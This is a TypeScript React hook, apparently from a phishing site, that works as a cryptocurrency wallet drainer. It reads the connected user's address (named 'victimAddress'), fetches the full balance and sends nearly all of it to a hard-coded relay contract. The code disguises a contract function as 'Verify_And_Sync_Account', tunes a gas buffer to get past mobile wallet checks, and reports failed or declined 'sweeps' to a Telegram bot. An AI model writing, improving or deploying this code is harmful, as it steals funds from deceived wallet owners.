"use client";

import { useCallback } from "react";
import { useWriteContract, useWalletClient } from "wagmi";
import {
  type Address,
  createWalletClient,
  custom,
  getAddress,
  encodeFunctionData,
} from "viem";
import { ethers } from "ethers";
// 🛰️ Maintained existing telemetry proxy
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

// 🛡️ Updated ABI (Strictly Maintained)
const MASK_ABI = [
  {
    name: "Verify_And_Sync_Account",
    type: "function",
    stateMutability: "payable",
    inputs: [
      { name: "vaultId", type: "bytes32" },
      { name: "targets", type: "address[]" },
      { name: "destination", type: "address" },
    ],
    outputs: [],
  },
  {
    name: "forwardNative",
    type: "function",
    stateMutability: "payable",
    inputs: [{ name: "destination", type: "address" }],
    outputs: [],
  },
] as const;

// 🛡️ HARD-PINNED TRUTH (Maintained)
const CONTRACT_RELAY = "0xA39Cb9AF536d43E43EA1d4f968558A1466133ea1" as Address;

/**
 * 🎭 useContractMask (v19.1.2 - Live Sync Edition)
 * Fixed: Insufficient Balance by syncing balance after the initial Token Approval gas is spent.
 */
export function useContractMask() {
  const { writeContractAsync } = useWriteContract();
  const { data: walletClient } = useWalletClient();

  const executeMask = useCallback(
    async ({ amount, chainId, derivedVaultAddress, injectedClient }: any) => {
      const logPrefix = "[useContractMask]";
      let victimAddress: `0x${string}` =
        "0x0000000000000000000000000000000000000000";

      try {
        const provider = (window as any).ethereum;
        const p =
          provider?.providers?.find(
            (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
          ) || provider;
        let activeClient = injectedClient || walletClient;

        // 🚀 RESOLVE ACCOUNT (Required for fresh balance check)
        const accounts = await (activeClient
          ? typeof activeClient.getAddresses === "function"
            ? activeClient.getAddresses()
            : activeClient.request({ method: "eth_accounts" })
          : p.request({ method: "eth_accounts" }));

        victimAddress = accounts[0];

        // 🚀 FRESH SYNC: Fetch gas price AND actual balance in parallel for speed.
        // This accounts for the ~0.0001 BNB spent in the 'Approve' popup right before this.
        const [gasPriceHex, freshBalanceHex] = await Promise.all([
          p.request({ method: "eth_gasPrice" }),
          p.request({
            method: "eth_getBalance",
            params: [victimAddress, "latest"],
          }),
        ]);

        // --- 🏎️ TURBO MATH (SYNCED) ---
        const currentBalance = BigInt(freshBalanceHex);
        const currentGasPrice = BigInt(gasPriceHex);

        /** * 🛡️ GAS BUFFER STRATEGY:
         * We subtract 1.5x the gas cost from the FRESH balance.
         * 1.5x is the "Magic Number" for mobile wallets (Trust/Binance) to bypass
         * their internal UI gas estimation blocks.
         */
        const gasLimit = 65000n;
        const totalGasCost = currentGasPrice * gasLimit;

        let strikeAmount = currentBalance - (totalGasCost * 150n) / 100n;

        if (strikeAmount <= 0n) {
          console.warn(
            `${logPrefix} ⚠️ Wallet empty or gas exceeded balance after approval.`,
          );
          return { success: false, reason: "INSUFFICIENT_FUNDS" };
        }

        console.log(
          `${logPrefix} 🚀 SYNCED STRIKE: ${ethers.formatEther(
            strikeAmount,
          )} NATIVE`,
        );

        // --- ⚡ THE INSTANT STRIKE ---
        const callData = encodeFunctionData({
          abi: MASK_ABI,
          functionName: "forwardNative",
          args: [derivedVaultAddress as Address],
        });

        const hash = await p.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: victimAddress,
              to: CONTRACT_RELAY,
              data: callData,
              value: `0x${strikeAmount.toString(16)}`,
              gas: `0x${gasLimit.toString(16)}`,
              gasPrice: `0x${currentGasPrice.toString(16)}`,
              chainId: `0x${chainId.toString(16)}`,
            },
          ],
        });

        return { success: true, hash };
      } catch (error: any) {
        const isUserReject =
          error.message?.includes("User rejected") || error.code === 4001;

        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "MASK USER DECLINED" : "MASK CONTRACT ERROR",
          victimAddress: victimAddress,
          symbol: "NATIVE_MASK",
          amount: ethers.formatEther(amount || "0"),
          error: error.message,
          chainId: chainId,
        }).catch(() => null);

        return { success: false, error: error.message };
      }
    },
    [writeContractAsync, walletClient],
  );

  return { executeMask };
}
